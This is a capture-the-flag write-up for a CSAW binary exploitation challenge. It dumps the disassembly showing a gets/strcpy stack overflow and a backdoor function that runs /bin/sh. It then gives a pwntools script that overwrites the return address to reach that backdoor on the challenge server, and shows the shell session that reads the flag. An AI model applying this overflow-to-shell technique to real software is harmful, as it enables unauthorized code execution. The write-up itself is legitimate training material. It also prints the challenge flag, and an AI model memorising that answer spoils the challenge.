* BinExp

* Find the password hardcoded?
- strings
- xxd
- reverse with bninja or ida

* password is password
```
nc pwn.chal.csaw.io 5000
Enter the password to get in: 
>password
You got in!!!!%   
```

* but no flag

* there is a backdoor function that we need to use to shell into (as the func calls /bin/sh)
```
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401248 <+0>:     push   %rbp
   0x0000000000401249 <+1>:     mov    %rsp,%rbp
   0x000000000040124c <+4>:     mov    $0x0,%eax
   0x0000000000401251 <+9>:     call   0x401185 <init>
   0x0000000000401256 <+14>:    mov    $0x0,%eax
=> 0x000000000040125b <+19>:    call   0x4011aa <password_checker>
   0x0000000000401260 <+24>:    mov    $0x0,%eax
   0x0000000000401265 <+29>:    pop    %rbp
   0x0000000000401266 <+30>:    ret   
   
(gdb) disas password_checker
Dump of assembler code for function password_checker:
   0x00000000004011aa <+0>:     push   %rbp
   0x00000000004011ab <+1>:     mov    %rsp,%rbp
   0x00000000004011ae <+4>:     sub    $0xa0,%rsp
   0x00000000004011b5 <+11>:    lea    0xe54(%rip),%rdi        # 0x402010
   0x00000000004011bc <+18>:    mov    $0x0,%eax
   0x00000000004011c1 <+23>:    call   0x401050 <printf@plt>
   0x00000000004011c6 <+28>:    lea    -0x40(%rbp),%rax
   0x00000000004011ca <+32>:    mov    %rax,%rdi
   0x00000000004011cd <+35>:    mov    $0x0,%eax
   0x00000000004011d2 <+40>:    call   0x401070 <gets@plt>
   0x00000000004011d7 <+45>:    lea    -0x40(%rbp),%rdx
   0x00000000004011db <+49>:    lea    -0x70(%rbp),%rax
   0x00000000004011df <+53>:    mov    %rdx,%rsi
   0x00000000004011e2 <+56>:    mov    %rax,%rdi
   0x00000000004011e5 <+59>:    call   0x401030 <strcpy@plt>
   0x00000000004011ea <+64>:    lea    -0xa0(%rbp),%rax
   0x00000000004011f1 <+71>:    movabs $0x64726f7773736170,%rcx
   0x00000000004011fb <+81>:    mov    %rcx,(%rax)
   0x00000000004011fe <+84>:    movb   $0x0,0x8(%rax)
   0x0000000000401202 <+88>:    lea    -0xa0(%rbp),%rdx
   0x0000000000401209 <+95>:    lea    -0x70(%rbp),%rax
   0x000000000040120d <+99>:    mov    %rdx,%rsi
   0x0000000000401210 <+102>:   mov    %rax,%rdi
   0x0000000000401213 <+105>:   call   0x401060 <strcmp@plt>
   0x0000000000401218 <+110>:   mov    %eax,-0x4(%rbp)
   0x000000000040121b <+113>:   cmpl   $0x0,-0x4(%rbp)
   0x000000000040121f <+117>:   jne    0x401234 <password_checker+138>
   0x0000000000401221 <+119>:   lea    0xe09(%rip),%rdi        # 0x402031
   0x0000000000401228 <+126>:   mov    $0x0,%eax
   0x000000000040122d <+131>:   call   0x401050 <printf@plt>
   0x0000000000401232 <+136>:   jmp    0x401245 <password_checker+155>
   0x0000000000401234 <+138>:   lea    0xe05(%rip),%rdi        # 0x402040
   0x000000000040123b <+145>:   mov    $0x0,%eax
   0x0000000000401240 <+150>:   call   0x401050 <printf@plt>
   0x0000000000401245 <+155>:   nop
   0x0000000000401246 <+156>:   leave  
   0x0000000000401247 <+157>:   ret    
End of assembler dump.

(gdb) disas backdoor
Dump of assembler code for function backdoor:
   0x0000000000401172 <+0>:     push   %rbp
   0x0000000000401173 <+1>:     mov    %rsp,%rbp
   0x0000000000401176 <+4>:     lea    0xe8b(%rip),%rdi        # 0x402008
   0x000000000040117d <+11>:    call   0x401040 <system@plt>
   0x0000000000401182 <+16>:    nop
   0x0000000000401183 <+17>:    pop    %rbp
   0x0000000000401184 <+18>:    ret    
End of assembler dump.

(gdb) break *0x0000000000401172
Breakpoint 2 at 0x401172

(gdb) run <<< $(python -c 'print "A"*70+"\xcc"*2+"\x72\x11\x40\x00\x00\x00\x00"')
Starting program: /home/kali/password_checker <<< $(python -c 'print "A"*70+"\xcc"*2+"\x72\x11\x40\x00\x00\x00\x00"')

Breakpoint 1, 0x000000000040125b in main ()
(gdb) c
Continuing.
Enter the password to get in: 
>This is not the password
Breakpoint 2, 0x0000000000401172 in backdoor ()
(gdb) c
Continuing.
[Detaching after vfork from child process 2802]
[Inferior 1 (process 2800) exited normally]
(gdb) run <<< $(python -c 'print "A"*70+"\xcc"*2+"\x72\x11\x40\x00\x00\x00\x00"')Quit
(gdb) 
zsh: suspended  gdb ./password_checker

```

* exploit
```
from pwn import *

buff = "A"*70
nop = "\xcc"*2
backdoor = "\x72\x11\x40\x00\x00\x00\x00"

payload = buff + nop + backdoor

host = "pwn.chal.csaw.io"
port = "5000"

connect = remote(host, port)

connect.sendline(payload)

connect.interactive()
```

* flag
```
┌──(kali㉿kali)-[~]
└─$ python3 pwnCsaw.py                                                                                  1 ⚙
[+] Opening connection to pwn.chal.csaw.io on port 5000: Done
/home/kali/pwnCsaw.py:14: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  connect.sendline(payload)
[*] Switching to interactive mode
Enter the password to get in: 
>This is not the password$ ls
flag.txt
password_checker
$ cat flag.txt
flag{ch4r1i3_4ppr3ci4t35_y0u_f0r_y0ur_h31p}
$ 
[*] Interrupted
[*] Closed connection to pwn.chal.csaw.io port 5000
                                                          
```